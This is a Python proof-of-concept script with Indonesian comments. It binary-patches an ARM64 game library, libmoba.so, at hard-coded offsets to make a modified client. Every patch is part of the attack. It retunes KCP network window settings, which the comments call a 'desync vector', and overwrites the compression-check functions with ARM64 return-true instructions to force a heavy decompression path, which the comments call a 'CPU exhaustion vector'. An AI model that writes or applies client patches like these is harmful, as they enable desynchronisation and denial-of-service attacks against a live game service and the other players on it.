import os

# Alamat/Offset yang diidentifikasi dalam libmoba.so (ARM64)
OFFSETS = {
    'IKCP_MTU_DEF': 0x1c70c8,
    'IKCP_WND_SND': 0x1c70c0,
    'IKCP_WND_RCV': 0x1c70c4,
    'IKCP_INTERVAL': 0x1c70d0,
    'IKCP_RTO_NDL': 0x1c7098,
    'KCP_IsZipEnabled': 0xca7b0,
    'KCP_EnableZip': 0xca7a0,
    'g_iZipControlCode': 0x1c7088
}

def create_poc():
    source = 'libmoba.so'
    target = 'lib-moba-test.so'

    if not os.path.exists(source):
        print(f"Error: {source} tidak ditemukan!")
        return

    with open(source, 'rb') as f:
        data = bytearray(f.read())

    print(f"[*] Memulai patching {source}...")

    # 1. Tuning Network untuk Stabilitas Client (Mencegah "Kejang")
    data[OFFSETS['IKCP_MTU_DEF']:OFFSETS['IKCP_MTU_DEF']+4] = (1400).to_bytes(4, 'little')
    data[OFFSETS['IKCP_INTERVAL']:OFFSETS['IKCP_INTERVAL']+4] = (100).to_bytes(4, 'little')

    # 2. Manipulasi Window untuk Penumpukan Data (Desync Vector)
    data[OFFSETS['IKCP_WND_SND']:OFFSETS['IKCP_WND_SND']+4] = (128).to_bytes(4, 'little')
    data[OFFSETS['IKCP_WND_RCV']:OFFSETS['IKCP_WND_RCV']+4] = (128).to_bytes(4, 'little')

    # 3. Patch Logic Zip (CPU Exhaustion Vector)
    # ARM64: MOV W0, #1; RET -> 20 00 80 52 C0 03 5F D6
    patch_zip = bytes.fromhex('20008052c0035fd6')
    data[OFFSETS['KCP_IsZipEnabled']:OFFSETS['KCP_IsZipEnabled']+8] = patch_zip
    data[OFFSETS['KCP_EnableZip']:OFFSETS['KCP_EnableZip']+8] = patch_zip

    # 4. Zip Control Code (Memicu Jalur Dekompresi Berat)
    data[OFFSETS['g_iZipControlCode']:OFFSETS['g_iZipControlCode']+4] = (1).to_bytes(4, 'little')

    with open(target, 'wb') as f:
        f.write(data)

    print(f"[+] Berhasil membuat {target}")
    print("[!] Gunakan file ini untuk analisis desinkronisasi halus.")

if __name__ == "__main__":
    create_poc()
